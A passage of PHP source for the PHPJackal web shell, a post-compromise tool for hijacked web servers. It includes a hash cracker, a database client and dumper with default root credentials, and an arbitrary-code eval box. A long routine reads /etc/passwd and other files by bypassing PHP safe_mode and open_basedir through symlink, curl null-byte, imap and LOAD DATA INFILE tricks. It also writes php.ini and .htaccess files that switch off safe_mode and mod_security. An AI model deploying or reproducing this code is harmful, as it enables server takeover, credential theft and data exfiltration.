				echo "Can not open dictionary.";
			}
		} else {
			if ($_REQUEST ['min'] <= $_REQUEST ['max']) {
				if ($type == 'unix')
					$code = 'if(!isset($hash_class))$hash_class = new PasswordHash ( 8, TRUE );$test = ($hash_class->CheckPassword ( $word, \'' . $hash . '\' ));';
				else
					$code = '$test=("' . $hash . '" == strtoupper(hash("' . $type . '","' . $salt1 . '".$word."' . $salt2 . '")));';
				if (isset ( $ntlm ))
					$code = '$word = iconv ( "UTF-8", "UTF-16LE", $word );' . $code;
				if ($res = brute ( $_REQUEST ['mode'], $_REQUEST ['min'], $_REQUEST ['max'], $code ))
					echo "Plaintext: <b>$res</b><br />";
			}
		}
		echo 'Finished!</font>';
	}
	echo '
<form method="POST" name="hashform" class="form"><div class="fieldwrapper"><label class="styled" style="width:320px">Hash cracker</label></div>
<div class="fieldwrapper"><label class="styled">Input:</label><div class="thefield">
<select name="mode" id="mode" onChange="toggle()">
<option value="09">Bruteforce [0-9]</option>
<option value="az">Bruteforce [a-z]</option>
<option value="az09">Bruteforce [a-z] [0-9]</option>
<option value="az09AZ">Bruteforce [a-z] [A-Z] [0-9]</option>
<option value="all">Bruteforce [ALL]</option>
<option value="wl">Wordlist</option>
</select>
</div></div><div class="fieldwrapper" id="dic"><label class="styled">Dictionary:</label><div class="thefield"><input type="text" name="dictionary" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Hash:</label><div class="thefield"><input type="text" name="hash" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Type:</label><div class="thefield">
<select name=type><option value=md2>MD2</option><option value=md4>MD4</option><option value=md5>MD5</option><option value=joomla>MD5(Hash+Salt) Joomla</option><option value=oscommerce>MD5(Salt+Hash) osCommerce</option><option value=unix>MD5(Unix) Wordpress/phpBB 3</option><option value=ntlm>NTLM</option><option value=sha1>SHA1</option><option value=sha224>SHA224</option><option value=sha256>SHA256</option><option value=sha384>SHA384</option><option value=sha512>SHA512</option></select><input type="submit" name="bench" value="Benchmark" style="margin-left: 10px;" /></div></div><div class="fieldwrapper"><label class="styled"><input type=checkbox name=loG value=1 onClick="document.hashform.logfilE.disabled = !document.hashform.logfilE.disabled;" checked> Log:</label><div class="thefield"><input type=text name=logfilE size=25 value="' . whereistmP () . DIRECTORY_SEPARATOR . '.log"></div></div>' . $hcwd . '
<input type="submit" value="Crack" style="margin-left: 150px;" /></div></form>
<script type="text/JavaScript">
toggle();
</script>
';
}
function pr0xy() {
	global $hcwd;
	echo '<form method="POST" class="feedbackform"><div class="fieldwrapper"><label class="styled">Navigator:</label><div class="thefield"><input type="url" name="urL" value="';
	if (empty ( $_REQUEST ['urL'] ))
		echo 'http://showip.com';
	else
		echo htmlspecialchars ( $_REQUEST ['urL'] );
	echo '" size="30" /></div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Go" style="margin-left: 150px;" /></div></form>';
	if (! empty ( $_REQUEST ['urL'] )) {
		echo '<br /><iframe src="' . hlink ( 'p0d=' . base64_encode ( $_REQUEST ['urL'] ) ) . '" align="center" frameborder="0" style="width: 100%; height: 600px;">
  <p>Your browser does not support iframes.</p>
</iframe>';
	}
}
function sqlclienT() {
	global $hcwd;
	if (! empty ( $_REQUEST ['serveR'] ) && ! empty ( $_REQUEST ['useR'] ) && isset ( $_REQUEST ['pasS'] ) && ! empty ( $_REQUEST ['querY'] )) {
		$server = $_REQUEST ['serveR'];
		$type = $_REQUEST ['typE'];
		$pass = $_REQUEST ['pasS'];
		$user = $_REQUEST ['useR'];
		$query = $_REQUEST ['querY'];
		$db = (empty ( $_REQUEST ['dB'] )) ? '' : $_REQUEST ['dB'];
		$res = querY ( $type, $server, $user, $pass, $db, $query );
		if ($res) {
			$res = str_replace ( '|-|-|-|-|-|', '</td><td>', $res );
			$res = str_replace ( '|+|+|+|+|+|', '</td></tr><tr onMouseOver="this.className=\'highlight\'" onMouseOut="this.className=\'normal\'"><td>', $res );
			$r = explode ( '[+][+][+]', $res );
			$r [1] = str_replace ( '[-][-][-]', "</th><th>", $r [1] );
			echo '<table border="0" cellspacing="0" cellpadding="0" class="sortable"><tr><th>' . $r [1] . '</th></tr><tr onMouseOver="this.className=\'highlight\'" onMouseOut="this.className=\'normal\'"><td>' . $r [0] . "</td></tr></table><br />";
		} else {
			echo "Failed!<br />";
		}
	}
	if (empty ( $_REQUEST ['typE'] ))
		$_REQUEST ['typE'] = '';
	echo '
<script type="text/javascript">
var ser=new Array()
var q=new Array()
var h=new Array()
ser[0]="SERVER:"
ser[1]="SERVER:"
ser[2]="DSN:"
ser[3]="SERVER:"
ser[4]="SERVER:"

q[0]="SHOW DATABASES"
q[1]="SHOW DATABASES"
q[2]="SHOW TABLES"
q[3]="SHOW DATABASES"
q[4]="SHOW DATABASES"

h[0]=false
h[1]=false
h[2]=true
h[3]=false
h[4]=false


function showtext(){
document.getElementById("database").hidden =  h[document.getElementById("type").selectedIndex];
if((document.getElementById("query").value=="SHOW DATABASES") || (document.getElementById("query").value=="SHOW TABLES" ))document.getElementById("query").value =  q[document.getElementById("type").selectedIndex];
document.getElementById("server").innerHTML = ser[document.getElementById("type").selectedIndex];
}
</script>
<form name=client method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">SQL client</label>
</div><div class="fieldwrapper">
<label class="styled">Type:</label>
<div class="thefield">
<select onChange="showtext()" name="typE" id="type">
<option value=MySQL ';
	if ($_REQUEST ['typE'] == 'MySQL')
		echo 'selected';
	echo '>MySQL</option>
<option value=MSSQL ';
	if ($_REQUEST ['typE'] == 'MSSQL')
		echo 'selected';
	echo '>MSSQL</option>
<option value=ODBC ';
	if ($_REQUEST ['typE'] == 'ODBC')
		echo 'selected';
	echo '>ODBC</option>
<option value=Oracle ';
	if ($_REQUEST ['typE'] == 'Oracle')
		echo 'selected';
	echo '>Oracle</option>
<option value=PostgreSQL ';
	if ($_REQUEST ['typE'] == 'PostgreSQL')
		echo 'selected';
	echo '>PostgreSQL</option>
</select>
</div>
</div><div class="fieldwrapper">
<label class="styled" id="server">Server:</label>
<div class="thefield">
<input type="text" name="serveR" value="';
	if (! empty ( $_REQUEST ['serveR'] ))
		echo htmlspecialchars ( $_REQUEST ['serveR'] );
	else
		echo 'localhost';
	echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="useR" value="';
	if (! empty ( $_REQUEST ['useR'] ))
		echo htmlspecialchars ( $_REQUEST ['useR'] );
	else
		echo 'root';
	echo '" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name="pasS" value="';
	if (isset ( $_REQUEST ['pasS'] ))
		echo htmlspecialchars ( $_REQUEST ['pasS'] );
	else
		echo '123456';
	echo '" size="30" />
</div>
</div><div class="fieldwrapper"  id="database">
<label class="styled">Database:</label>
<div class="thefield">
<input type="text" name="dB" value="';
	if (isset ( $_REQUEST ['dB'] ))
		echo htmlspecialchars ( $_REQUEST ['dB'] );
	echo '" size="30" />
</div>
</div> <div class="fieldwrapper">
<label class="styled">Query:</label>
<div class="thefield">
<textarea name="querY" id="query">';
	if (! empty ( $_REQUEST ['querY'] ))
		echo htmlspecialchars ( ($_REQUEST ['querY']) );
	else
		echo 'SHOW DATABASES';
	echo '</textarea>
</div>
</div>' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" value="Query" style="margin-left: 150px;" />
</div></form><script language="javascript">showtext()</script>';
}
function querY($type, $host, $user, $pass, $db = '', $query) {
	$res = '';
	switch ($type) {
		case 'MySQL' :
			if (! checkfunctioN ( 'mysql_connect' ))
				return 0;
			$link = mysql_connect ( $host, $user, $pass );
			if ($link) {
				if (! empty ( $db ))
					mysql_select_db ( $db, $link );
				$result = mysql_query ( $query, $link );
				while ( $data = mysql_fetch_row ( $result ) )
					$res .= implode ( '|-|-|-|-|-|', $data ) . '|+|+|+|+|+|';
				$res .= '[+][+][+]';
				for($i = 0; $i < mysql_num_fields ( $result ); $i ++)
					$res .= mysql_field_name ( $result, $i ) . '[-][-][-]';
				mysql_close ( $link );
				return $res;
			}
			break;
		case 'MSSQL' :
			if (! checkfunctioN ( 'mssql_connect' ))
				return 0;
			$link = mssql_connect ( $host, $user, $pass );
			if ($link) {
				if (! empty ( $db ))
					mssql_select_db ( $db, $link );
				$result = mssql_query ( $query, $link );
				while ( $data = mssql_fetch_row ( $result ) )
					$res .= implode ( '|-|-|-|-|-|', $data ) . '|+|+|+|+|+|';
				$res .= '[+][+][+]';
				for($i = 0; $i < mssql_num_fields ( $result ); $i ++)
					$res .= mssql_field_name ( $result, $i ) . '[-][-][-]';
				mssql_close ( $link );
				return $res;
			}
			break;
		case 'ODBC' :
			if (! checkfunctioN ( 'odbc_connect' ))
				return 0;
			$link = odbc_connect ( $host, $user, $pass );
			if ($link) {
				if (strstr ( trim ( strtoupper ( $query ) ), 'SHOW TABLES' ) != false)
					$result = odbc_tables ( $link );
				else
					$result = odbc_exec ( $link, $query );
				while ( $data = odbc_fetch_array ( $result ) )
					$res .= implode ( '|-|-|-|-|-|', $data ) . '|+|+|+|+|+|';
				$res .= '[+][+][+]';
				for($i = 1; $i < odbc_num_fields ( $result ); $i ++)
					$res .= odbc_field_name ( $result, $i ) . '[-][-][-]';
				odbc_close ( $link );
				return $res;
			}
			break;
		case 'Oracle' :
			if (! checkfunctioN ( 'ocilogon' ))
				return 0;
			$link = oci_connect ( $user, $pass, $db );
			if ($link) {
				$stm = ociparse ( $link, $query );
				ociexecute ( $stm, OCI_DEFAULT );
				while ( $data = ocifetchinto ( $stm, $data, OCI_ASSOC + OCI_RETURN_NULLS ) )
					$res .= implode ( '|-|-|-|-|-|', $data ) . '|+|+|+|+|+|';
				$res .= '[+][+][+]';
				for($i = 0; $i < oci_num_fields ( $stm ); $i ++)
					$res .= oci_field_name ( $stm, $i ) . '[-][-][-]';
				return $res;
			}
			break;
		case 'PostgreSQL' :
			if (! checkfunctioN ( 'pg_connect' ))
				return 0;
			$link = pg_connect ( "host=$host dbname=$db user=$user password=$pass" );
			if ($link) {
				$result = pg_query ( $link, $query );
				while ( $data = pg_fetch_row ( $result ) )
					$res .= implode ( '|-|-|-|-|-|', $data ) . '|+|+|+|+|+|';
				$res .= '[+][+][+]';
				for($i = 0; $i < pg_num_fields ( $result ); $i ++)
					$res .= pg_field_name ( $result, $i ) . '[-][-][-]';
				pg_close ( $link );
				return $res;
			}
			break;
	}
	return 0;
}
function brainFUCK($code) {
	$stack = array ();
	$pointer = 0;
	$result = '';
	for($i = 0; $i < strlen ( $code ); $i ++) {
		switch ($code {$i}) {
			case '+' :
				$stack [$pointer] ++;
				if ($stack [$pointer] > 255)
					$stack [$pointer] = 1;
				break;
			case '-' :
				$stack [$pointer] --;
				if ($stack [$pointer] < 0)
					$stack [$pointer] = 255;
				break;
			case '>' :
				$pointer ++;
				break;
			case '<' :
				$pointer --;
				break;
			case '.' :
				$result .= chr ( $stack [$pointer] );
				break;
			case '[' :
				$this->loop_points [] = $i;
				break;
			case ']' :
				if ($stack [$pointer] > 0)
					$i = $this->loop_points [sizeof ( $this->loop_points ) - 1];
				else
					array_pop ( $this->loop_points );
				break;
			case ',' :
				$stack [$pointer] = chr ( $stack [$pointer] );
				break;
			case '#' :
				$this->result .= " debug::" . $stack [$pointer] . " ";
				break;
			case '?' :
				$this->result .= "<pre>[" . print_r ( $stack, true ) . "]</pre>";
				break;
			case '%' :
				$stack = array ();
				$pointer = 0;
				$this->loop_points = array ();
				break;
			default :
				break;
		}
	}
}
function phpevaL() {
	global $hcwd, $windows, $VERSION;
	echo '<form class="form" method="POST">';
	if (! empty ( $_REQUEST ['code'] )) {
		echo '<div class="fieldwrapper"><label class="styled">Output:</label><div class="thefield">
</div></div><pre>';
		if ($_REQUEST ['lang'] == 'php') {
			$s = array ('<?php' => '', '<?=' => '', '<?' => '', '?>' => '' );
			echo htmlspecialchars ( eval ( replace_stR ( $s, $_REQUEST ['code'] ) ) );
		} elseif ($_REQUEST ['lang'] == 'javascript' || $_REQUEST ['lang'] == 'vbscript') {
			echo '<script type="text/' . $_REQUEST ['lang'] . '">';
			echo strip_tags ( $_REQUEST ['code'] );
			echo '</script>';
		}
		echo '</pre>';
	}
	echo '<div class="fieldwrapper"><label class="styled">Code:</label><div class="thefield"></div></div>
<textarea cols="80" rows="20" class="lined" name="code">';
	if (! empty ( $_REQUEST ['code'] ))
		echo htmlspecialchars ( $_REQUEST ['code'] );
	else
		echo 'if($windows){
   $obj = new COM("WScript.Shell");
   $obj->Run("notepad", 9);
   sleep(2);
   $obj->SendKeys("PHPJackal v$VERSION{ENTER}By Nima Ghotbi");
}
';
	echo '</textarea>
' . $hcwd . '<div class="buttonsdiv"><select name="lang"><option value="php" ';
	if (! isset ( $_REQUEST ['lang'] ))
		$_REQUEST ['lang'] = '';
	if ($_REQUEST ['lang'] == 'php')
		echo 'selected';
	echo '>PHP</option><option value="javascript" ';
	if ($_REQUEST ['lang'] == 'javascript')
		echo 'selected';
	echo '>JavaScript</option><option value="vbscript" ';
	if ($_REQUEST ['lang'] == 'vbscript')
		echo 'selected';
	echo '>VBScript</option></select><input type="submit" value="Execute" style="margin-left: 150px;" /></div></form><script>
$(function() {
$(".lined").linedtextarea(
{selectedLine: 1}
);
});
</script>';
}
function toolS() {
	global $hcwd, $cwd;
	if (! empty ( $_REQUEST ['serveR'] ) && ! empty ( $_REQUEST ['domaiN'] )) {
		$ser = @fsockopen ( $_REQUEST ['serveR'], 43, $en, $es, 5 );
		fputs ( $ser, $_REQUEST ['domaiN'] . "\r\n" );
		echo '<pre>';
		while ( ! feof ( $ser ) )
			echo fgets ( $ser, 1024 );
		echo '</pre>';
		fclose ( $ser );
	} elseif (! empty ( $_REQUEST ['serveR'] ) && ! empty ( $_REQUEST ['dB'] ) && ! empty ( $_REQUEST ['useR'] ) && ! empty ( $_REQUEST ['pasS'] ) && ! empty ( $_REQUEST ['ouT'] )) {
		$Link = mysql_connect ( $_REQUEST ['serveR'], $_REQUEST ['useR'], $_REQUEST ['pasS'] );
		$DB = $_REQUEST ['dB'];
		$Dump = "/*
Dump generated by PHPJackal
*/


DROP DATABASE IF EXISTS `$DB`;
CREATE DATABASE `$DB`;

";
		mysql_select_db ( $DB, $Link );
		$result = mysql_query ( "SHOW TABLES", $Link );
		$table = array ();
		while ( $data = mysql_fetch_row ( $result ) )
			$table [] = $data [0];
		foreach ( $table as $t ) {
			$Dump .= "DROP TABLE IF EXISTS `$t`;
";
			$result = mysql_query ( "SHOW CREATE TABLE `$t`", $Link );
			while ( $data = mysql_fetch_row ( $result ) ) {
				$Dump .= $data [1] . ";\n\n";
			}
			$sql = "select * from `$t`;";
			$result = mysql_query ( $sql );
			$num_rows = mysql_num_rows ( $result );
			$num_fields = mysql_num_fields ( $result );
			if ($num_rows > 0) {
				$field_type = array ();
				$i = 0;
				while ( $i < $num_fields ) {
					$meta = mysql_fetch_field ( $result, $i );
					array_push ( $field_type, $meta->type );
					$i ++;
				}
				$Dump .= "INSERT INTO `$t` VALUES";
				$index = 0;
				while ( $row = mysql_fetch_row ( $result ) ) {
					$Dump .= "(";
					for($i = 0; $i < $num_fields; $i ++) {
						if (is_null ( $row [$i] ))
							$Dump .= "null";
						else {
							switch ($field_type [$i]) {
								case 'int' :
									$Dump .= $row [$i];
									break;
								case 'string' :
								case 'blob' :
								default :
									$Dump .= "'" . mysql_real_escape_string ( $row [$i] ) . "'";
							}
						}
						if ($i < $num_fields - 1)
							$Dump .= ",";
					}
					$Dump .= ")";
					if ($index < $num_rows - 1)
						$Dump .= ",";
					else
						$Dump .= ";";
					$Dump .= "\n";
					$index ++;
				}
			}
		}
		file_put_contents ( $_REQUEST ['ouT'], $Dump );
		echo "<b>Done! </b>[<a href=\"" . hlinK ( "workingdiR=" . dirname ( $_REQUEST ['ouT'] ) . "&downloaD=" . basename ( $_REQUEST ['ouT'] ) ) . "\">Download</a>]<br />";
	} elseif (! empty ( $_REQUEST ['urL'] )) {
		$h = '';
		$u = parse_url ( $_REQUEST ['urL'] );
		$host = $u ['host'];
		$file = (! empty ( $u ['path'] )) ? $u ['path'] : '/';
		$port = (empty ( $u ['port'] )) ? 80 : $u ['port'];
		$ser = @fsockopen ( $host, $port, $en, $es, 5 );
		if ($ser) {
			fputs ( $ser, "GET $file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n" );
			echo '<pre>';
			while ( $h != "\r\n" ) {
				$h = fgets ( $ser, 1024 );
				echo $h;
			}
			echo '</pre>';
			fclose ( $ser );
		}
	} elseif (! empty ( $_REQUEST ['ouT'] ) && isset ( $_REQUEST ['pW'] ) && ! empty ( $_REQUEST ['uN'] )) {
		$htpasswd = $_REQUEST ['ouT'] . DIRECTORY_SEPARATOR . '.htpasswd';
		$htaccess = $_REQUEST ['ouT'] . DIRECTORY_SEPARATOR . '.htaccess';
		file_put_contents ( $htpasswd, $_REQUEST ['uN'] . ':' . crypt ( trim ( $_REQUEST ['pW'] ), CRYPT_STD_DES ) );
		file_put_contents ( $htaccess, "AuthName \"Secure\"\r\nAuthType Basic\r\nAuthUserFile $htpasswd\r\nRequire valid-user\r\n" );
		echo 'Done';
	}
	echo '
<form method="POST" class="feedbackform"><div class="fieldwrapper">
<label class="styled" style="width:320px">MySQL Dump</label>
</div>
<div class="fieldwrapper">
<label class="styled">Server:</label>
<div class="thefield">
<input type="text" name=serveR value="';
	if (! empty ( $_REQUEST ['serveR'] ))
		echo htmlspecialchars ( $_REQUEST ['serveR'] );
	else
		echo 'localhost';
	echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Database:</label>
<div class="thefield">
<input type="text" name=dB value="';
	if (! empty ( $_REQUEST ['dB'] ))
		echo htmlspecialchars ( $_REQUEST ['dB'] );
	else
		echo 'users';
	echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name=useR value="';
	if (! empty ( $_REQUEST ['useR'] ))
		echo htmlspecialchars ( $_REQUEST ['useR'] );
	else
		echo 'root';
	echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name=pasS value="';
	if (! empty ( $_REQUEST ['pasS'] ))
		echo htmlspecialchars ( $_REQUEST ['pasS'] );
	else
		echo '123456';
	echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Output:</label>
<div class="thefield">
<input type="text" name=ouT value="';
	if (! empty ( $_REQUEST ['ouT'] ))
		echo htmlspecialchars ( $_REQUEST ['ouT'] );
	else
		echo whereistmP () . DIRECTORY_SEPARATOR . 'dump.sql';
	echo '" size="30" />
</div>
</div>
' . $hcwd . '<div class="buttonsdiv">
<input type="submit" value="Dump" style="margin-left: 150px;" />
</div></form><br />
<form method="POST" class="feedbackform"><div class="fieldwrapper">
<label class="styled" style="width:320px">Whois</label>
</div>
<div class="fieldwrapper">
<label class="styled">Server:</label>
<div class="thefield">
<input type="text" name=serveR value="';
	if (! empty ( $_REQUEST ['serveR'] ))
		echo htmlspecialchars ( $_REQUEST ['serveR'] );
	else
		echo 'whois.geektools.com';
	echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Domain:</label>
<div class="thefield">
<input type="text" name=domaiN value="';
	if (! empty ( $_REQUEST ['domaiN'] ))
		echo htmlspecialchars ( $_REQUEST ['domaiN'] );
	else
		echo 'google.com';
	echo '" size="30" />
</div>
</div>' . $hcwd . '<div class="buttonsdiv">
<input type="submit" value="Whois" style="margin-left: 150px;" />
</div></form>
<br />
<form method="POST" class="feedbackform"><div class="fieldwrapper">
<label class="styled" style="width:320px">.htpasswd generator</label>
</div>
<div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name=uN value="';
	if (! empty ( $_REQUEST ['uN'] ))
		echo htmlspecialchars ( $_REQUEST ['uN'] );
	else
		echo 'r00t';
	echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Password:</label>
<div class="thefield">
<input type="text" name=pW value="';
	if (! empty ( $_REQUEST ['pW'] ))
		echo htmlspecialchars ( $_REQUEST ['pW'] );
	else
		echo uniqid ( '@' );
	echo '" size="30" />
</div>
</div>
<div class="fieldwrapper">
<label class="styled">Directory:</label>
<div class="thefield">
<input type="text" name=ouT value="';
	if (! empty ( $_REQUEST ['ouT'] ))
		echo htmlspecialchars ( $_REQUEST ['ouT'] );
	else
		echo $cwd;
	echo '" size="30" />
</div>
</div>' . $hcwd . '<div class="buttonsdiv">
<input type="submit" value="Generate" style="margin-left: 150px;" />
</div></form>
<br />
<form method="POST" class="feedbackform"><div class="fieldwrapper">
<label class="styled" style="width:320px">Header grabber</label>
</div>
<div class="fieldwrapper">
<label class="styled">URL:</label>
<div class="thefield">
<input type="url" name=urL value="';
	if (! empty ( $_REQUEST ['urL'] ))
		echo htmlspecialchars ( $_REQUEST ['urL'] );
	else
		echo 'http://google.com/';
	echo '" size="30" />
</div>
</div>' . $hcwd . '<div class="buttonsdiv">
<input type="submit" value="Get" style="margin-left: 150px;" />
</div></form>';
}
function hexvieW() {
	if (! empty ( $_REQUEST ['filE'] )) {
		$f = $_REQUEST ['filE'];
		echo "<table border=0 style='border-collapse: collapse' width='100%'><th width='10%' bgcolor='#282828'>Offset</th><th width='25%' bgcolor='#282828'>Hex</th><th width='25%' bgcolor='#282828'></th><th width='40%' bgcolor='#282828'>ASCII</th></tr>";
		$file = fopen ( $f, 'r' );
		$i = - 1;
		while ( ! feof ( $file ) ) {
			$ln = '';
			$i ++;
			echo "<tr><td width='10%' bgcolor='#";
			if ($i % 2 == 0)
				echo '666666';
			else
				echo '808080';
			echo "'>";
			echo str_repeat ( '0', (8 - strlen ( dechex ( $i * 16 ) )) ) . dechex ( $i * 16 );
			echo '</td>';
			echo "<td width='25%' bgcolor='#";
			if ($i % 2 == 0)
				echo '666666';
			else
				echo '808080';
			echo "'>";
			for($j = 0; $j <= 7; $j ++) {
				if (! feof ( $file )) {
					$tmp = strtoupper ( dechex ( ord ( fgetc ( $file ) ) ) );
					if (strlen ( $tmp ) == 1)
						$tmp = '0' . $tmp;
					echo $tmp . ' ';
					$ln .= $tmp;
				}
			}
			echo "</td><td width='25%' bgcolor='#";
			if ($i % 2 == 0)
				echo '666666';
			else
				echo '808080';
			echo "'>";
			for($j = 7; $j <= 14; $j ++) {
				if (! feof ( $file )) {
					$tmp = strtoupper ( dechex ( ord ( fgetc ( $file ) ) ) );
					if (strlen ( $tmp ) == 1)
						$tmp = '0' . $tmp;
					echo $tmp . ' ';
					$ln .= $tmp;
				}
			}
			echo "</td><td width='40%' bgcolor='#";
			if ($i % 2 == 0)
				echo '666666';
			else
				echo '808080';
			echo "'>";
			$n = 0;
			$asc = '';
			$co = 0;
			for($k = 0; $k <= 16; $k ++) {
				$co = hexdec ( substr ( $ln, $n, 2 ) );
				if (($co <= 31) || (($co >= 127) && ($co <= 160)))
					$co = 46;
				$asc .= chr ( $co );
				$n += 2;
			}
			echo htmlspecialchars ( $asc );
			echo '</td></tr>';
		}
	}
	fclose ( $file );
	echo '</table>';
}
function safemodE() {
	global $windows, $hcwd;
	$file = (empty ( $_REQUEST ['file'] )) ? '/etc/passwd' : $_REQUEST ['file'];
	$pr = "\r\n</font><font color=green>Method ";
	$po = ")</font><font color=#FA0>\r\n";
	$i = 1;
	if (! empty ( $_REQUEST ['read'] )) {
		echo "<pre>$pr$i:(ini_restore$po";
		ini_restore ( 'safe_mode' );
		ini_restore ( 'open_basedir' );
		readfile ( $file );
		$i ++;
		if (checkfunctioN ( "ioncube_read_file" )) {
			echo "$pr$i:(ionCube$po";
			echo ioncube_read_file ( $file );
			$i ++;
		}
		if (checkfunctioN ( 'symlink' )) {
			echo "$pr$i:(symlink$po";
			$lnk = whereistmP () . DIRECTORY_SEPARATOR . uniqid ( 'lnk_' );
			@symlink ( $file, $lnk );
			@readfile ( $lnk );
			@unlink ( $lnk );
			$i ++;
		}
		echo "$pr$i:(include$po";
		include ($file);
		$i ++;
		echo "$pr$i:(copy$po";
		$tmp = tempnam ( '', 'cx' );
		copy ( 'compress.zlib://' . $file, $tmp );
		$fh = fopen ( $tmp, 'r' );
		$data = fread ( $fh, filesize ( $tmp ) );
		fclose ( $fh );
		echo $data;
		$i ++;
		if (checkfunctioN ( 'mb_send_mail' )) {
			echo "$pr$i:(mb_send_mail$po";
			if (file_exists ( '/tmp/mb_send_mail' ))
				unlink ( '/tmp/mb_send_mail' );
			mb_send_mail ( NULL, NULL, NULL, NULL, '-C $file -X /tmp/mb_send_mail' );
			readfile ( '/tmp/mb_send_mail' );
			$i ++;
		}
		if (checkfunctioN ( 'curl_init' )) {
			echo "$pr$i:(curl_init [A]$po";
			$fh = curl_init ( 'file://' . $file . '' );
			$tmp = curl_exec ( $fh );
			echo $tmp;
			$i ++;
			echo "$pr$i:(curl_init [B]$po";
			$i ++;
			if (strstr ( $file, DIRECTORY_SEPARATOR ))
				$ch = curl_init ( 'file:///' . $file . "\x00/../../../../../../../../../../../../" . __FILE__ );
			else
				$ch = curl_init ( 'file://' . $file . "\x00" . __FILE__ );
			var_dump ( curl_exec ( $ch ) );
		}
		if ($windows) {
			echo "$pr$i:(shell$po";
			echo shelL ( "type \"$file\"" );
			$i ++;
		} else {
			echo "$pr$i:(shell$po";
			echo shelL ( "cat $file" );
			$i ++;
		}
		if (checkfunctioN ( 'imap_open' )) {
			echo "$pr$i:(imap [A]$po";
			$str = imap_open ( '/etc/passwd', '', '' );
			$list = imap_list ( $str, $file, '*' );
			for($i = 0; $i < count ( $list ); $i ++)
				echo $list [$i] . "\n";
			imap_close ( $str );
			$i ++;
			echo "$pr$i:(imap [B]$po";
			$str = imap_open ( $file, '', '' );
			$tmp = imap_body ( $str, 1 );
			echo $tmp;
			imap_close ( $str );
			$i ++;
		}
		if ($file == '/etc/passwd') {
			echo "$pr$i:(posix$po";
			for($uid = 0; $uid < 99999; $uid ++) {
				$h = posix_getpwuid ( $uid );
				if (! empty ( $h )) {
					foreach ( $h as $k => $v ) {
						echo "$v";
						if ($k != 'shell')
							echo ":";
					}
					echo "\r\n";
				}
			}
		}
		echo "\n</pre></font>";
	} elseif (! empty ( $_REQUEST ['show'] )) {
		echo "<pre>$pr$i:(glob$po";
		$con = glob ( "$file*" );
		foreach ( $con as $v )
			echo "$v\n";
		$i ++;
		if (checkfunctioN ( 'imap_open' )) {
			echo "$pr$i:(imap$po";
			$str = imap_open ( '/etc/passwd', '', '' );
			$s = explode ( "|", $file );
			if (count ( $s ) > 1)
				$list = imap_list ( $str, trim ( $s [0] ), trim ( $s [1] ) );
			else
				$list = imap_list ( $str, trim ( $str [0] ), '*' );
			for($i = 0; $i < count ( $list ); $i ++)
				echo "$list[$i]\r\n";
			imap_close ( $str );
			$i ++;
		}
		if (class_exists ( 'COM' )) {
			echo "$pr$i:(COM$po";
            $ws = new COM ( 'WScript.Shell' );
			$exec = comshelL ( "dir \"$file\"", $ws );
			$exec = str_replace ( "\t", '', $exec );
			echo $exec;
			$i ++;
		}
		if (checkfunctioN ( 'win_shell_execute' )) {
			echo "$pr$i:(win32std$po";
			echo winshelL ( "dir \"$file\"" );
			$i ++;
		}
		if (checkfunctioN ( 'win32_create_service' )) {
			echo "$pr$i:(win32service$po";
			echo srvshelL ( "dir \"$file\"" );
		}
		echo "\n</pre></font>";
	} elseif (! empty ( $_REQUEST ['create'] )) {
		$i = 1;
		$dir = dirname ( __FILE__ ) . DIRECTORY_SEPARATOR;
		if (is_writable ( $dir )) {
			echo "<pre>$pr$i:(php.ini$po";
			file_put_contents ( $dir . 'php.ini', "safe_mode = Off\r\ndisable_functions = NONE\r\nsafe_mode_gid = Off\r\nopen_basedir = Off" );
			echo "\nphp.ini created!\n";
			$i ++;
			echo "$pr$i:(ini.ini$po";
			file_put_contents ( $dir . 'ini.ini', "safe_mode = Off\r\ndisable_functions = NONE\r\nsafe_mode_gid = Off\r\nopen_basedir = Off" );
			echo "\nini.ini created!\n";
			$i ++;
			echo "$pr$i:(.htaccess$po";
			file_put_contents ( $dir . '.htaccess', "<IfModule mod_security.c>\r\nSecFilterEngine Off\r\nSecFilterScanPOST Off\r\nSecFilterCheckCookieFormat Off\r\nSecFilterNormalizeCookies Off\r\nSecFilterCheckURLEncoding Off\r\nSecFilterCheckUnicodeEncoding Off\r\n</IfModule>" );
			echo "\n.htaccess created!\n";
			echo "\nCheck if safe-mode is off.\n</pre></font>";
		} else
			echo "Local directory is not writable!";
	} elseif (! empty ( $_REQUEST ['sql'] )) {
		$ta = uniqid ( 'N' );
		$s = array ("CREATE TEMPORARY TABLE $ta (file LONGBLOB)", "LOAD DATA INFILE '" . addslashes ( $_REQUEST ['file'] ) . "' INTO TABLE $ta", "SELECT * FROM $ta" );
		$l = mysql_connect ( 'localhost', $_REQUEST ['user'], $_REQUEST ['pass'] );
		mysql_select_db ( $_REQUEST ['db'], $l );
		echo '<pre><font color=#FA0>';
		foreach ( $s as $v ) {
			$q = mysql_query ( $v, $l );
			while ( $d = mysql_fetch_row ( $q ) )
				echo htmlspecialchars ( $d [0] );
		}
		echo '</pre></font>';
	} elseif (! empty ( $_REQUEST ['serveR'] ) && ! empty ( $_REQUEST ['coM'] ) && ! empty ( $_REQUEST ['dB'] ) && ! empty ( $_REQUEST ['useR'] ) && isset ( $_REQUEST ['pasS'] )) {
		$res = '';
		$tb = uniqid ( 'NJ' );
		$db = mssql_connect ( $_REQUEST ['serveR'], $_REQUEST ['useR'], $_REQUEST ['pasS'] );
